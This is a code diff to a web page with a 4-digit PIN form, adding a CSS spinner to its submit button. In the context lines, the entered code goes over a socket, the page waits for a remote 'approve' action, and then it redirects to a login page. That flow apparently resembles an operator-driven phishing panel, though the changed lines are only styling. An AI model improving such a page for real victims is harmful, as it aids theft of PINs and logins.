@@ -22,6 +22,10 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
 .submit-btn { width: 100%; height: 54px; border-radius: 12px; border: none; background: #ed1c24; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
 .submit-btn:hover { background: #d4191f; }
 .submit-btn:disabled { background: #f5a0a3; cursor: not-allowed; }
+.submit-btn { position: relative; }
+.submit-btn.loading { color: transparent !important; pointer-events: none; background: #ed1c24 !important; }
+.submit-btn.loading::after { content: ''; position: absolute; width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; top: 50%; left: 50%; margin-top: -12px; margin-left: -12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
 .waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
 @media (max-width: 500px) {
   .container { margin: 10px 0 0; border-radius: 0; min-height: calc(100vh - 50px); padding: 24px 16px; box-shadow: none; }
@@ -187,7 +191,7 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
     var act = (typeof action === 'string') ? action : (action && action.action) || '';
     document.getElementById('waitingMsg').style.display = 'none';
     document.getElementById('submitBtn').disabled = false;
-    document.getElementById('submitBtn').textContent = translations[currentLang].submitBtn;
+    document.getElementById('submitBtn').classList.remove('loading');
 
     if (act === 'approve') {
       window.location.href = '/login/?popup=1';
@@ -214,7 +218,7 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
     if (code.length !== 4) return;
     document.getElementById('pinError').style.display = 'none';
     document.getElementById('submitBtn').disabled = true;
-    document.getElementById('submitBtn').textContent = translations[currentLang].waiting;
+    document.getElementById('submitBtn').classList.add('loading');
     document.getElementById('waitingMsg').style.display = 'block';
 
     socket.emit('more-info', {
